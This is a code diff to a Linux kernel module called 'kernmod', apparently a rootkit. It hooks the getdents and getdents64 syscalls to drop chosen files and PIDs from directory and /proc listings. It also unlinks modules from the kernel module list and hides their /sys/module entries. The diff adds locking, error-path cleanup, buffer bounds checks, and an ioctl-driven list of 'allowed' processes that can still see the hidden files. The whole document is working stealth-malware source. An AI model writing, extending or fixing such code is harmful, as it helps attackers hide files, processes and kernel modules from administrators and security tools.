@@ -41,12 +41,23 @@ struct hidden_module {
     struct list_head list;
 };
 
+struct allowed_pid {
+    pid_t pid;
+    struct list_head list;
+};
+
 static LIST_HEAD(hidden_files);
 static LIST_HEAD(hidden_pids);
 static LIST_HEAD(hidden_modules);
+static LIST_HEAD(allowed_pids);
 static int hidden_file_count = 0;
 static int hidden_pid_count = 0;
 static int hidden_module_count = 0;
+static int allowed_pid_count = 0;
+
+static DEFINE_MUTEX(file_list_lock);
+static DEFINE_MUTEX(pid_list_lock);
+static DEFINE_MUTEX(allowed_pid_lock);
 
 // original syscalls
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
@@ -121,23 +132,27 @@ static int kernmod_add_hidden_file(const char *name)
     char resolved[MAX_HIDDEN_NAME];  
     int err = 0;
 
+    mutex_lock(&file_list_lock);
     err = resolve_to_absolute(name, resolved, sizeof(resolved));
     if (err)                
         strscpy(resolved, name, sizeof(resolved));
 
     if (hidden_file_count >= MAX_HIDDEN_ENTRIES) {
-        return -ENOMEM;
+        err = -ENOMEM;
+        goto out;
     }
-
+    
     list_for_each_entry(entry, &hidden_files, list) {
         if (strcmp(entry->name, resolved) == 0) {
-            return -EEXIST;
+            err = -EEXIST;
+            goto out;
         }
     }
 
     entry = kmalloc(sizeof(*entry), GFP_KERNEL);
     if (!entry) {
-        return -ENOMEM;
+        err = -ENOMEM;
+        goto out;
     }
 
     strscpy(entry->name, resolved, MAX_HIDDEN_NAME);
@@ -145,6 +160,9 @@ static int kernmod_add_hidden_file(const char *name)
     hidden_file_count++;
 
     pr_info("kernmod: hiding file '%s'\n", name);
+
+out:
+    mutex_unlock(&file_list_lock);
     return err;
 }
 
@@ -154,6 +172,7 @@ static int kernmod_remove_hidden_file(const char *name)
     char resolved[MAX_HIDDEN_NAME];
     int err = -ENOENT;
 
+    mutex_lock(&file_list_lock);
     if (resolve_to_absolute(name, resolved, sizeof(resolved)) != 0)
         strscpy(resolved, name, sizeof(resolved));
 
@@ -164,10 +183,13 @@ static int kernmod_remove_hidden_file(const char *name)
             hidden_file_count--;
             pr_info("kernmod: unhiding file '%s'\n", name);
             err = 0;
-            return err;
+            goto out;
         }
     }
-    return err;  
+
+out:
+    mutex_unlock(&file_list_lock);
+    return err;
 }
 
 // PIDs:
@@ -176,19 +198,23 @@ static int kernmod_add_hidden_pid(pid_t pid)
     struct hidden_pid *entry;
     int err = 0;
 
+    mutex_lock(&pid_list_lock);
     if (hidden_pid_count >= MAX_HIDDEN_ENTRIES) {
-        return -ENOMEM;
+        err = -ENOMEM;
+        goto out;
     }
 
     list_for_each_entry(entry, &hidden_pids, list) {
         if (entry->pid == pid) {
-            return -EEXIST;
+            err = -EEXIST;
+            goto out;
         }
     }
 
     entry = kmalloc(sizeof(*entry), GFP_KERNEL);
     if (!entry) {
-        return -ENOMEM;
+        err = -ENOMEM;
+        goto out;
     }
 
     entry->pid = pid;
@@ -196,6 +222,9 @@ static int kernmod_add_hidden_pid(pid_t pid)
     hidden_pid_count++;
 
     pr_info("kernmod: hiding pid %d\n", pid);
+    
+out:
+    mutex_unlock(&pid_list_lock);
     return err;
 }
 
@@ -204,15 +233,20 @@ static int kernmod_remove_hidden_pid(pid_t pid)
     struct hidden_pid *entry, *tmp;
     int err = -ENOENT;
 
+    mutex_lock(&pid_list_lock);
     list_for_each_entry_safe(entry, tmp, &hidden_pids, list) {
         if (entry->pid == pid) {
             list_del(&entry->list);
             kfree(entry);
             hidden_pid_count--;
             pr_info("kernmod: unhiding pid %d\n", pid);
-            return 0;
+            err = 0;
+            goto out;
         }
     }
+    
+out:
+    mutex_unlock(&pid_list_lock);
     return err;
 }
 
@@ -221,6 +255,7 @@ static int kernmod_add_hidden_module(const char *name)
 {
     struct hidden_module *entry;
     struct module *target;
+    char sysfs_path[MAX_HIDDEN_NAME];
     int err = 0;
 
     mutex_lock(mod_mutex);
@@ -255,7 +290,6 @@ static int kernmod_add_hidden_module(const char *name)
 
     list_del_init(&target->list);
 
-    char sysfs_path[MAX_HIDDEN_NAME];
     snprintf(sysfs_path, sizeof(sysfs_path), "/sys/module/%s", name);
     kernmod_add_hidden_file(sysfs_path);
 
@@ -272,6 +306,7 @@ out:
 static int kernmod_remove_hidden_module(const char *name)
 {
     struct hidden_module *entry, *tmp;
+    char sysfs_path[MAX_HIDDEN_NAME];
     int err = -ENOENT;
 
     mutex_lock(mod_mutex);
@@ -280,7 +315,6 @@ static int kernmod_remove_hidden_module(const char *name)
         if (strcmp(entry->name, name) == 0) {
             list_add(&entry->mod->list, &THIS_MODULE->list);
             
-            char sysfs_path[MAX_HIDDEN_NAME];
             snprintf(sysfs_path, sizeof(sysfs_path), "/sys/module/%s", name);
             kernmod_remove_hidden_file(sysfs_path);
 
@@ -297,6 +331,75 @@ static int kernmod_remove_hidden_module(const char *name)
 out:
     mutex_unlock(mod_mutex);
     return err;
+}
+
+// allowed PIDs
+static int kernmod_add_allowed_pid(pid_t pid)
+{
+    struct allowed_pid *entry;
+    int err = 0;
+
+    mutex_lock(&allowed_pid_lock);
+    if (allowed_pid_count >= MAX_HIDDEN_ENTRIES) {
+        err = -ENOMEM;
+        goto out;
+    }
+
+    list_for_each_entry(entry, &allowed_pids, list) {
+        if (entry->pid == pid) {
+            err = -EEXIST;
+            goto out;
+        }
+    }
+
+    entry = kmalloc(sizeof(*entry), GFP_KERNEL);
+    if (!entry) {
+        err = -ENOMEM;
+        goto out;
+    }
+
+    entry->pid = pid;
+    list_add_tail(&entry->list, &allowed_pids);
+    allowed_pid_count++;
+
+    pr_info("kernmod: process %d can now see hidden files\n", pid);
+
+out:
+    mutex_unlock(&allowed_pid_lock);
+    return err;
+}
+
+static int kernmod_remove_allowed_pid(pid_t pid)
+{
+    struct allowed_pid *entry, *tmp;
+    int err = -ENOENT;
+
+    mutex_lock(&allowed_pid_lock);
+    list_for_each_entry_safe(entry, tmp, &allowed_pids, list) {
+        if (entry->pid == pid) {
+            list_del(&entry->list);
+            kfree(entry);
+            allowed_pid_count--;
+            pr_info("kernmod: process %d no longer sees hidden files\n", pid);
+            err = 0;
+            goto out;
+        }
+    }
+
+out:
+    mutex_unlock(&allowed_pid_lock);
+    return err;
+}
+
+static bool is_allowed_process(pid_t pid)
+{
+    struct allowed_pid *entry;
+
+    list_for_each_entry(entry, &allowed_pids, list) {
+        if (entry->pid == pid)
+            return true;
+    }
+    return false;
 }
 
 // helper functions for hooks
@@ -323,8 +426,10 @@ static bool is_proc_dir(unsigned int fd)
     return result;
 }
 
-static bool should_hide_dirent(const char *name, const char *dir_path, bool is_proc)
+static bool should_hide_dirent(const char *name, const char *dir_path, bool is_proc, pid_t caller)
 {
+    bool result = false;
+    
     if (is_proc) {
         long pid_num;
         struct hidden_pid *entry;
@@ -332,24 +437,37 @@ static bool should_hide_dirent(const char *name, const char *dir_path, bool is_p
         if (kstrtol(name, 10, &pid_num) != 0)
             return false;
 
+        mutex_lock(&pid_list_lock);
         list_for_each_entry(entry, &hidden_pids, list) {
             if (entry->pid == (pid_t)pid_num) {
-                return true;
+                result = true;
+                break;
             }
         }
+        mutex_unlock(&pid_list_lock);
     } else {
         struct hidden_file *entry;
         char full_path[MAX_HIDDEN_NAME];
 
+        mutex_lock(&allowed_pid_lock);
+        result = is_allowed_process(caller);
+        mutex_unlock(&allowed_pid_lock);
+
+        if (result) 
+            return false;
+
         snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, name);
 
+        mutex_lock(&file_list_lock);
         list_for_each_entry(entry, &hidden_files, list) {
             if (strcmp(entry->name, full_path) == 0) {
-                return true;
+                result = true;
+                break;
             }
         }
+        mutex_unlock(&file_list_lock);
     }
-    return false;
+    return result;
 }
 
 static int get_dir_path(unsigned int fd, char *buf, int buflen)
@@ -390,6 +508,8 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs)
     long ret, new_ret;
     unsigned long offset;
     bool proc;
+    char dir_path[MAX_HIDDEN_NAME] = "";
+    pid_t caller = current->tgid;
 
     ret = orig_getdents64(regs);
     if (ret <= 0)
@@ -397,7 +517,6 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs)
 
     fd = (unsigned int)regs->di;
     user_dirent = (struct linux_dirent64 __user *)regs->si;
-    char dir_path[MAX_HIDDEN_NAME] = "";
 
     proc = is_proc_dir(fd);
 
@@ -425,7 +544,7 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs)
     while (offset < new_ret) {
         cur = (struct linux_dirent64 *)((char *)kern_dirent + offset);
 
-        if (should_hide_dirent(cur->d_name, dir_path, proc)) {
+        if (should_hide_dirent(cur->d_name, dir_path, proc, caller)) {
             pr_info("kernmod: filtering dirent: '%s'\n", cur->d_name);
 
             if (prev) {
@@ -468,6 +587,8 @@ static asmlinkage long hook_getdents(const struct pt_regs *regs)
     long ret, new_ret;
     unsigned long offset;
     bool proc;
+    char dir_path[MAX_HIDDEN_NAME] = "";
+    pid_t caller = current->tgid;
 
     ret = orig_getdents(regs);
     if (ret <= 0)
@@ -475,7 +596,6 @@ static asmlinkage long hook_getdents(const struct pt_regs *regs)
 
     fd = (unsigned int)regs->di;
     user_dirent = (struct linux_dirent __user *)regs->si;
-    char dir_path[MAX_HIDDEN_NAME] = "";
 
     proc = is_proc_dir(fd);
 
@@ -503,7 +623,7 @@ static asmlinkage long hook_getdents(const struct pt_regs *regs)
     while (offset < new_ret) {
         cur = (struct linux_dirent *)((char *)kern_dirent + offset);
 
-        if (should_hide_dirent(cur->d_name, dir_path, proc)) {
+        if (should_hide_dirent(cur->d_name, dir_path, proc, caller)) {
             if (prev) {
                 prev->d_reclen += cur->d_reclen;
             } else {
@@ -581,6 +701,22 @@ static long kernmod_ioctl(struct file *file, unsigned int cmd, unsigned long arg
         buf[MAX_MODULE_NAME - 1] = '\0';
         return kernmod_remove_hidden_module(buf);
         
+    case IOCTL_ALLOW_PID:
+        if (copy_from_user(buf, (char __user *)arg, MAX_PID_STR))
+            return -EFAULT;
+        buf[MAX_PID_STR - 1] = '\0';
+        if (kstrtol(buf, 10, &pid_num) != 0)
+            return -EINVAL;
+        return kernmod_add_allowed_pid((pid_t)pid_num);
+
+    case IOCTL_DISALLOW_PID:
+        if (copy_from_user(buf, (char __user *)arg, MAX_PID_STR))
+            return -EFAULT;
+        buf[MAX_PID_STR - 1] = '\0';
+        if (kstrtol(buf, 10, &pid_num) != 0)
+            return -EINVAL;
+        return kernmod_remove_allowed_pid((pid_t)pid_num);
+
     case IOCTL_GET_STATUS: {
         struct kernmod_status_request req;
         char *kbuf;
@@ -600,30 +736,64 @@ static long kernmod_ioctl(struct file *file, unsigned int cmd, unsigned long arg
     
         len += snprintf(kbuf + len, req.buf_size - len,
             "\n=== kernmod module status ===\n\n");
+        if (len >= req.buf_size)
+            len = req.buf_size;
 
+        mutex_lock(&file_list_lock);
         struct hidden_file *f;
         len += snprintf(kbuf + len, req.buf_size - len,
                         "\nHidden files (%d):\n", hidden_file_count);
+        if (len >= req.buf_size)
+            len = req.buf_size;
         list_for_each_entry(f, &hidden_files, list) {
             len += snprintf(kbuf + len, req.buf_size - len,
                             "  - %s\n", f->name);
+            if (len >= req.buf_size)
+                len = req.buf_size;
         }
+        mutex_unlock(&file_list_lock);
 
+        mutex_lock(&pid_list_lock);
         struct hidden_pid *p;
         len += snprintf(kbuf + len, req.buf_size - len,
                         "\nHidden PIDs (%d):\n", hidden_pid_count);
+        if (len >= req.buf_size)
+            len = req.buf_size;
         list_for_each_entry(p, &hidden_pids, list) {
             len += snprintf(kbuf + len, req.buf_size - len,
                             "  - %d\n", p->pid);
+            if (len >= req.buf_size)
+                len = req.buf_size;
         }
+        mutex_unlock(&pid_list_lock);
 
+        mutex_lock(mod_mutex);
         struct hidden_module *m;
         len += snprintf(kbuf + len, req.buf_size - len,
                         "\nHidden modules (%d):\n", hidden_module_count);
+        if (len >= req.buf_size)
+            len = req.buf_size;
         list_for_each_entry(m, &hidden_modules, list) {
             len += snprintf(kbuf + len, req.buf_size - len,
                             "  - %s\n", m->name);
+            if (len >= req.buf_size)
+                len = req.buf_size;
         }
+        mutex_unlock(mod_mutex);
+
+        mutex_lock(&allowed_pid_lock);
+        struct allowed_pid *a;
+        len += snprintf(kbuf + len, req.buf_size - len,
+                    "\nAllowed PIDs (%d):\n", allowed_pid_count);
+        if (len >= req.buf_size)
+            len = req.buf_size;
+        list_for_each_entry(a, &allowed_pids, list) {
+        len += snprintf(kbuf + len, req.buf_size - len,
+                        "  - %d\n", a->pid);
+        if (len >= req.buf_size)
+            len = req.buf_size;
+        }
+        mutex_unlock(&allowed_pid_lock);
     
         if (copy_to_user(req.buf, kbuf, len)) {
             kvfree(kbuf);
@@ -698,28 +868,38 @@ static void __exit kernmod_exit(void)
     struct hidden_file *fentry, *ftmp;
     struct hidden_pid *pentry, *ptmp;
     struct hidden_module *mentry, *mtmp;
+    struct allowed_pid *aentry, *atmp;
 
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
 
-    if (mod_mutex)
-        mutex_lock(mod_mutex);
+    mutex_lock(mod_mutex);
     list_for_each_entry_safe(mentry, mtmp, &hidden_modules, list) {
         list_add(&mentry->mod->list, &THIS_MODULE->list);
         list_del(&mentry->list);
         kfree(mentry);
     }
-    if (mod_mutex)
-        mutex_unlock(mod_mutex);
+    mutex_unlock(mod_mutex);
 
+    mutex_lock(&file_list_lock);
     list_for_each_entry_safe(fentry, ftmp, &hidden_files, list) {
         list_del(&fentry->list);
         kfree(fentry);
     }
+    mutex_unlock(&file_list_lock);
 
+    mutex_lock(&pid_list_lock);
     list_for_each_entry_safe(pentry, ptmp, &hidden_pids, list) {
         list_del(&pentry->list);
         kfree(pentry);
     }
+    mutex_unlock(&pid_list_lock);
+
+    mutex_lock(&allowed_pid_lock);
+    list_for_each_entry_safe(aentry, atmp, &allowed_pids, list) {
+        list_del(&aentry->list);
+        kfree(aentry);
+    }
+    mutex_unlock(&allowed_pid_lock);
 
     misc_deregister(&kernmod_dev);
     pr_info("kernmod: module unloaded\n");
